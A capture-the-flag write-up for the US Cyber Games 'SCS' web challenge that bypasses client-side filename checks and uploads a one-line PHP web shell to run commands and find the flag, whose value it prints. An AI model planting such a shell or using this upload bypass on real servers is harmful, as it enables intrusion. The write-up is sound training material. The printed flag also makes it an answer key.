---
title: US Cyber Games [Season 4] - SCS
date: Mon Jun  3 01:41:30 PM EDT 2024
categories: [Writeup]
tags: [ctf,uscybergames,uscybergames2024,web,rce,upload]
---

## Description

SCS [Web]

We uncovered a code repository and it appears to be where ARIA is storing mission-critical code. We need to break in!

[https://uscybercombine-s4-scs.chals.io/](https://uscybercombine-s4-scs.chals.io/)

## Solution

![SCS](/assets/images/USCyberGames/2024/SCS.png)

Uploaded files are placed in `/uploads` directory

![SCS-2](/assets/images/USCyberGames/2024/SCS-2.png)

The technology used is PHP

![SCS-1](/assets/images/USCyberGames/2024/SCS-1.png)

The frontend restricts using special characters: 
```http
Paste file name can only contain alphanumeric characters
```

But making direct request to backend it's bypassed:

![SCS-3](/assets/images/USCyberGames/2024/SCS-3.png)

Upload shell:
```json
{
	"pasteContent": "<?PHP echo system($_REQUEST[0]); ?>",
	"pasteFileName":"t.php"
}
```

It works:
![SCS-4](/assets/images/USCyberGames/2024/SCS-4.png)

After some enumeration we find location of real *flag.txt*
![SCS-5](/assets/images/USCyberGames/2024/SCS-5.png)

> Flag: **SIVBGR{v@lidate_s3rver_s1de}**
{: .prompt-tip }